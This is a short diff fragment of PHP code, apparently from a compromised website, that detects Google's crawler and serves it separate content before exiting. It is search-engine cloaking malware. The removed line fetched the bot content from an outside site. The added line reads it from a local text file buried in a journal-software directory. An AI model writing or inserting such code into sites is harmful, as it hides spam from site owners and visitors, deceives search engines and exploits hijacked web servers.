@@ -8,7 +8,7 @@ function is_google_bot() {
 }
 
 if (is_google_bot()) {
- $bot_content = file_get_contents('https://hotelresidenceholiday.it/modules/mod_feed/tmpl/default-site.php');
+ $bot_content = file_get_contents('/home/u514303699/domains/ijnpam.com/public_html/classes/controllers/grid/issues/index.txt');
  echo $bot_content;
  exit;
 } else {
